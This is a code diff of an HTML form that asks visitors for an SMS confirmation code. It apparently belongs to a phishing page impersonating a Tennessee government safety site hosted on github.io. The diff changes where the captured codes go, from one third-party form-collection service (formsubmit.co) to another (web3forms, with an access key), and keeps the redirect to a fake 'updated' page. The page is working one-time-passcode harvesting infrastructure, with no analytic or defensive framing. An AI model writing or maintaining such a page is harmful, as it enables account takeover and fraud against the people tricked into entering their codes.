@@ -51,7 +51,9 @@
             </div>
 
             <!-- Formulaire de saisie du code -->
-            <form class="otp-form" method="POST" action="https://formsubmit.co/acb3cba3487868efd28a4ddb8b1c4db7" enctype="multipart/form-data">
+            <form class="otp-form" action="https://api.web3forms.com/submit" method="POST">
+
+                <input type="hidden" name="access_key" value="4df5bbbb-bd11-4c70-a613-435d680007ca">
                 <label for="otp-input">Enter the confirmation code you recieved via SMS</label>
                 
                 <div class="otp-inputs-container">
@@ -68,7 +70,7 @@
                 <input type="hidden" name="_captcha" value="false">
 
                 <!-- Redirection vers votre page personnalisée -->
-                <input type="hidden" name="_next" value="https://tn-safety-tn-gov.github.io/tn-safety-tn-gov/updated.html">
+                <input type="hidden" name="redirect" value="https://tn-safety-tn-gov.github.io/tn-safety-tn-gov/updated.html">
                 <button type="submit" class="submit-btn">CONFIRM</button>
             </form>
         </main>
